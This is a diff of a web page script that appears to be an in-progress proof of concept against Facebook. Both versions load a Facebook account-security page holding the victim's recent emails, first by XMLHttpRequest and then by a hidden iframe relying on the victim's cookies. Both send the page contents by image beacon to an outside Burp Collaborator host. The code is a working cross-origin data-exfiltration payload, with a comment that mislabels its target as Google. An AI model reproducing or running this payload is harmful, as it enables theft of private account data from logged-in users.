@@ -7,18 +7,32 @@
     <script>
         // Function to redirect to Google and capture response
         function redirectAndCapture() {
-            // Make a request to Google using XMLHttpRequest
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://www.facebook.com/recent_emails/security/?hide_back_button=1&from_accounts_center=1', true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === XMLHttpRequest.DONE) {
-                    // Send the response to the Burp Suite collaborator
-                    var response = xhr.responseText;
-                    var img = new Image();
-                    img.src = "http://co4n42didn6kb1bavvhgvsichixfygpwj.oast.pro?response=" + encodeURIComponent(response);
-                }
+            // Create a hidden iframe
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+
+            // Function to capture response
+            function captureResponse(response) {
+                // Send the response to the Burp Suite collaborator
+                var img = new Image();
+                img.src = "http://co4n42didn6kb1bavvhgvsichixfygpwj.oast.pro?response=" + encodeURIComponent(response);
+            }
+
+            // Set up iframe load event listener
+            iframe.onload = function() {
+                // Wait for a brief moment to allow cookies to be set
+                setTimeout(function() {
+                    // Capture the response
+                    var response = iframe.contentDocument.documentElement.outerHTML;
+                    captureResponse(response);
+                    // Remove the iframe
+                    document.body.removeChild(iframe);
+                }, 1000); // Adjust the delay as needed
             };
-            xhr.send();
+
+            // Set the iframe source to the target URL with cookies included
+            iframe.src = 'https://www.facebook.com/recent_emails/security/?hide_back_button=1&from_accounts_center=1';
         }
 
         // Call the function when the page loads
